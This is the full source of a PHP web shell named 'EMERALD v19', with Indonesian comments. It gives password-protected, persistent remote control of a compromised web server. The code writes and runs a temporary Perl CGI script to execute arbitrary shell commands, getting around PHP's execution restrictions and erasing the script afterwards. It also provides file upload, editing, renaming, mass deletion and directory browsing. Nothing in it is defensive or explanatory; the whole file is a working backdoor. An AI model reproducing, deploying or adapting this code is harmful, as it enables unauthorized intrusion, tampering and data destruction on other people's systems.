<?php
/**
 * EMERALD v19.0 - CGI HYBRID EDITION
 * Feature: CGI Terminal, Mass Delete, Persistent Session, Navigasi Terstruktur
 */
error_reporting(0);
session_start();

$pass = 'alfa'; 
$auth_id = md5($pass . $_SERVER['HTTP_USER_AGENT']);

// --- PERSISTENT LOGIN (Session + Cookie) ---
if (isset($_POST['key']) && $_POST['key'] === $pass) {
    $_SESSION['em_v19'] = $auth_id;
    setcookie('em_v19_c', $auth_id, time() + (86400 * 7), "/");
}

if ($_SESSION['em_v19'] !== $auth_id && $_COOKIE['em_v19_c'] !== $auth_id) {
    die('<html><body style="background:#000;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:monospace;"><form method="post"><div style="border:1px solid #0f8;padding:30px;text-align:center;"><h2>EMERALD v19</h2><input type="password" name="key" autofocus style="background:#000;border:1px solid #0f8;color:#0f8;padding:10px;"><br><button type="submit" style="margin-top:10px;width:100%;padding:10px;background:#008f58;color:#fff;border:none;cursor:pointer;font-weight:bold;">ENTER SYSTEM</button></div></form></body></html>');
}

// --- DIREKTORI SETUP ---
$d = isset($_GET['d']) ? base64_decode($_GET['d']) : getcwd();
$d = str_replace('\\', '/', $d);
@chdir($d); $d = getcwd();

$msg = ''; $out = '';

// --- LOGIKA TERMINAL CGI BYPASS ---
function cgi_executor($cmd) {
    $cgi_file = 'temp_exec_'.time().'.cgi';
    $path_perl = "/usr/bin/perl"; // Jalur standar perl di Linux
    
    $payload = "#!$path_perl\nprint \"Content-type: text/plain\\n\\n\";\nsystem(\"$cmd 2>&1\");";
    
    @file_put_contents($cgi_file, $payload);
    @chmod($cgi_file, 0755);

    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
    $url = $protocol . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/" . $cgi_file;

    // Eksekusi via cURL internal
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($ch);
    curl_close($ch);

    @unlink($cgi_file);
    return ($res) ? $res : "CGI FAIL: Pastikan folder memiliki izin ExecCGI atau coba pindahkan ke folder cgi-bin.";
}

// --- ACTIONS HANDLER ---
if(isset($_POST['cmd'])) { $out = cgi_executor($_POST['cmd']); }

if(isset($_FILES['u_f'])) { 
    if(@move_uploaded_file($_FILES['u_f']['tmp_name'], $_FILES['u_f']['name'])) $msg = "Upload Berhasil!"; 
}

if(isset($_POST['a_t'])) {
    $act = $_POST['a_t'];
    if($act == 'mk_d') @mkdir($_POST['n_i']);
    if($act == 'sv_f') @file_put_contents($_POST['n_i'], $_POST['cnt']);
    if($act == 'rn_i') @rename($_POST['old'], $_POST['new']);
    if($act == 'mass_del' && isset($_POST['files'])) {
        foreach($_POST['files'] as $f) {
            $f = base64_decode($f);
            is_dir($f) ? @rmdir($f) : @unlink($f);
        }
        $msg = "Batch Delete Berhasil.";
    }
}
if(isset($_GET['del'])) { @unlink(base64_decode($_GET['del'])); @rmdir(base64_decode($_GET['del'])); }

?>
<!DOCTYPE html>
<html>
<head>
    <title>Emerald v19 Platinum</title>
    <style>
        :root { --g: #00ff88; --bg: #050505; --card: #0d1110; --border: #1f3a2f; }
        body { background: var(--bg); color: #ccc; font-family: 'Consolas', monospace; margin: 0; display: flex; overflow: hidden; }
        .side { width: 320px; height: 100vh; background: var(--card); border-right: 1px solid var(--border); padding: 25px; box-sizing: border-box; overflow-y: auto; }
        .main { flex-grow: 1; height: 100vh; overflow-y: auto; padding: 35px; box-sizing: border-box; }
        .card { background: #000; border: 1px solid var(--border); padding: 18px; border-radius: 10px; margin-bottom: 25px; }
        input, textarea { background: #000; border: 1px solid #222; color: var(--g); padding: 12px; width: 100%; margin-bottom: 12px; border-radius: 5px; box-sizing: border-box; }
        .btn { background: #008f58; color: #fff; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 5px; transition: 0.3s; }
        .btn:hover { background: var(--g); color: #000; box-shadow: 0 0 10px var(--g); }
        table { width: 100%; border-collapse: collapse; }
        td, th { padding: 12px; border-bottom: 1px solid #111; text-align: left; font-size: 13px; }
        tr:hover { background: #0a0e0c; }
        .link { color: var(--g); text-decoration: none; font-weight: bold; }
        pre { background: #000; padding: 15px; border: 1px solid var(--g); color: #0f8; white-space: pre-wrap; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="side">
        <h2 style="color:var(--g); margin-top:0; letter-spacing: 2px;">EMERALD v19</h2>
        <div class="card">
            <h3 style="color:var(--g); font-size: 11px; text-transform: uppercase;">CGI Terminal</h3>
            <form method="post"><input type="text" name="cmd" placeholder="ls -la / id / whoami"></form>
        </div>
        <div class="card">
            <h3 style="color:var(--g); font-size: 11px; text-transform: uppercase;">File Upload</h3>
            <form method="post" enctype="multipart/form-data"><input type="file" name="u_f"><button class="btn">UPLOAD NOW</button></form>
        </div>
        <div class="card">
            <h3 style="color:var(--g); font-size: 11px; text-transform: uppercase;">New Item</h3>
            <form method="post"><input type="hidden" name="a_t" value="mk_d"><input type="text" name="n_i" placeholder="Folder Name"><button class="btn">MKDIR</button></form>
            <form method="post" style="margin-top:15px;"><input type="hidden" name="a_t" value="sv_f"><input type="text" name="n_i" placeholder="File Name"><button class="btn">TOUCH</button></form>
        </div>
        <a href="?logout=1" style="color:red; font-size:12px; text-decoration:none;">[ LOGOUT SESSION ]</a>
    </div>

    <div class="main">
        <?php if($msg) echo "<div class='card' style='border-color:var(--g); color:var(--g);'>$msg</div>"; ?>
        <div class="card"><strong>Directory:</strong> <span style="color:var(--g)"><?=$d?></span></div>
        
        <?php if($out): ?><div class="card"><h3>CGI Output:</h3><pre><?=htmlspecialchars($out)?></pre></div><?php endif; ?>

        <div class="card">
            <form method="post">
                <input type="hidden" name="a_t" value="mass_del">
                <table>
                    <thead>
                        <tr style="color:#666;">
                            <th width="30"><input type="checkbox" onclick="var c=document.getElementsByName('files[]');for(var i=0;i<c.length;i++)c[i].checked=this.checked"></th>
                            <th>NAME</th>
                            <th width="120">ACTION <button type="submit" style="background:#600; color:#fff; border:none; padding:3px 8px; cursor:pointer; font-size:9px; border-radius:3px;" onclick="return confirm('Hapus terpilih?')">MASS DEL</button></th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr><td></td><td><a href="?d=<?=base64_encode(dirname($d))?>" class="link">.. [ Parent Directory ]</a></td><td>-</td></tr>
                        <?php foreach(scandir('.') as $f): if($f=='.'||$f=='..')continue; ?>
                        <tr>
                            <td><input type="checkbox" name="files[]" value="<?=base64_encode($f)?>"></td>
                            <td><?=(is_dir($f)?'📁':'📄')?> <a href="<?=is_dir($f)?'?d='.base64_encode($d.'/'.$f):'#'?>" class="link"><?=$f?></a></td>
                            <td>
                                <a href="?d=<?=base64_encode($d)?>&e=<?=base64_encode($f)?>" style="color:#0af; text-decoration:none;">Edit</a> | 
                                <a href="?d=<?=base64_encode($d)?>&del=<?=base64_encode($f)?>" style="color:red; text-decoration:none;" onclick="return confirm('Hapus?')">Del</a>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </form>
        </div>

        <?php if(isset($_GET['e'])): $ef = base64_decode($_GET['e']); ?>
        <div class="card">
            <h3>Editor: <?=$ef?></h3>
            <form method="post">
                <input type="hidden" name="a_t" value="sv_f">
                <input type="hidden" name="n_i" value="<?=$ef?>">
                <textarea name="cnt" rows="18"><?=htmlspecialchars(@file_get_contents($ef))?></textarea>
                <button type="submit" class="btn">SAVE & UPDATE FILE</button>
            </form>
            <form method="post" style="margin-top:20px;">
                <input type="hidden" name="a_t" value="rn_i">
                <input type="hidden" name="old" value="<?=$ef?>">
                RENAME TO: <input type="text" name="new" style="width:250px;"> <button type="submit" class="btn" style="width:auto">OK</button>
            </form>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
